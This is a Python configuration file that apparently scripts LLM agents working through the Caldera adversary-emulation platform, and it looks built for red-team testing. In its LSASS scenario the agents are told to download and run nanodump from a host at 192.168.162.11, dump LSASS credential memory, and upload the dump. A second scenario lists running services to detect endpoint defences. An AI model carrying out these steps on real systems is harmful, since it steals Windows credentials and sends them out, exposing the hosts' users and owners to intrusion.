from agents.caldera_agent import caldera_agent_user_proxy, caldera_agent
from agents.human_agent import human_analyst_agent

actions = {
    "COLLECT_CALDERA_INFO": {
        "messages": [
            "Get the ID of the active Caldera operation.",
            "Get the PAW of the active Caldera agent by calling /api/v2/agents.",
            "Summarize the ID and PAW from previous steps in a table.",
        ],
        "agents": [human_analyst_agent, caldera_agent, caldera_agent_user_proxy],
    },
    "DOWNLOAD_AND_RUN_NANODUMP": {
        "messages": [
            "Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent.",
            "Analyze the available nanodump flags at https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
            "Use powershell to run the downloaded nanodump executable to dump LSASS without forking and pay attention to restoring the signature. Write the dump to C:\\temp.",
            "Use PowerShell to upload the dumped LSASS file.",
        ],
        "agents": [caldera_agent, caldera_agent_user_proxy],
    },
    "COLLECT_SERVICES": {
        "messages": [
            "List all the services that are running on the system and provide the raw command output."
        ],
        "agents": [caldera_agent, caldera_agent_user_proxy],
    },
}

scenarios = {
    "LSASS": ["COLLECT_CALDERA_INFO", "DOWNLOAD_AND_RUN_NANODUMP"],
    "DETECT_EDR": ["COLLECT_CALDERA_INFO", "COLLECT_SERVICES"],
}
